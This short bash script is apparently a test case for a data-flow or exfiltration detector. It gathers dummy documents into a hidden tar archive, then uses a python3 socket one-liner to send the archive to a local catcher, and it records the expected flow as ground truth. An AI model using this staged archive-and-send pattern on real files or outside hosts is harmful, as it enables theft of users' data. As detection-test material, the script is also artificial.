#!/usr/bin/env bash
# SPDX-License-Identifier: MIT
# trace: full
# Attack 5, staged exfiltration over two hops: tar gathers a documents directory into an archive
# (file -> tar -> archive file), then a separate python3 process sends the archive to a catcher on
# 14446 (archive -> python3 -> socket -> catcher). Ground truth: a document inside reaches the
# catcher, and the catcher receives exactly the archive's size.
set -eu
W=$1 M=$2 H=$(dirname "$0")/..
mkdir -p "$W/docs"
for i in 1 2 3; do head -c 20000 /dev/urandom | base64 >"$W/docs/report$i.txt"; done
python3 "$H/catcher.py" 14446 "$W/caught.tgz" "$W/ready" &
CAT=$!
for i in $(seq 100); do [ -f "$W/ready" ] && break; sleep 0.1; done
tar czf "$W/.stage.tgz" -C "$W" docs
size=$(stat -c %s "$W/.stage.tgz")
python3 -c "import socket,sys; s=socket.create_connection(('127.0.0.1',14446)); s.sendall(open(sys.argv[1],'rb').read()); s.close()" "$W/.stage.tgz"
wait $CAT
cmp "$W/caught.tgz" "$W/.stage.tgz" && echo "staged archive of $size bytes caught"
cat >"$M" <<J
{"reach": [{"name": "report2.txt to the catcher, through the archive", "from": {"path": "$W/docs/report2.txt"}, "to": {"listener_port": 14446}, "bytes": $size}],
 "rules": []}
J
